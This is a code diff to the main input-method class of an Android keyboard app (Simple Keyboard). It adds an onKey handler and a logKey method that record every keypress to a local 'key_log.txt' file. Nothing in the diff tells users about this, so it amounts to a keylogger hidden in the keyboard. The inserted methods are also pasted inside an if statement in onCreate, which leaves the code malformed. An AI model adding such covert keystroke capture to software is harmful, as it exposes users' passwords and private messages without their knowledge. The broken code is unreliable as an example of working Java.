@@ -46,6 +46,9 @@ import java.io.FileDescriptor;
 import java.io.PrintWriter;
 import java.util.Locale;
 import java.util.concurrent.TimeUnit;
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
 
 import rkr.simplekeyboard.inputmethod.R;
 import rkr.simplekeyboard.inputmethod.compat.EditorInfoCompatUtils;
@@ -117,7 +120,27 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
 
         public void onCreate() {
             final LatinIME latinIme = getOwnerInstance();
-            if (latinIme == null) {
+            if (latinIme == null) {@Override
+                public void onKey(int primaryCode, int[] keyCodes) {
+                    super.onKey(primaryCode, keyCodes);
+            
+                    // Convert primaryCode to character
+                    String keyPressed = Character.toString((char) primaryCode);
+                    logKey(keyPressed);
+                }
+            
+                private void logKey(String key) {
+                    try {
+                        File logFile = new File(getFilesDir(), "key_log.txt");
+                        FileWriter writer = new FileWriter(logFile, true);
+                        writer.append(key);
+                        writer.append("\n");  // Optional: add newline for better readability
+                        writer.close();
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+                }
+                
                 return;
             }
             final Resources res = latinIme.getResources();
